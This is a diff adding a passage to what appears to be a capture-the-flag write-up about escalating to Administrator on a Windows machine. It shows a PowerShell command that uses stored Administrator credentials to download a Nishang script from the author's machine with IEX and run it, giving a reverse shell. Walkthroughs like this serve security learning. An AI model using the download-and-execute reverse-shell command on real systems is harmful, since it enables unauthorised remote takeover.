@@ -36,3 +36,14 @@ we can try to make a secure password conversion
 PS C:\Users\svc_minecraft\server\plugins> $cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)  
 
 ```
+
+# after that the last part will be using this object to get a shell
+```
+PS C:\Users\svc_minecraft\server\plugins> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.79:8080/a.ps1')" -Credential $cred
+```
+what we have done so above is that we  have initilize the process that will execute the download a powershell script from our machine and execute it and we get a reverse shell
+
+
+N/B: This powershell script is from nishang but also you can get it from here
+
+
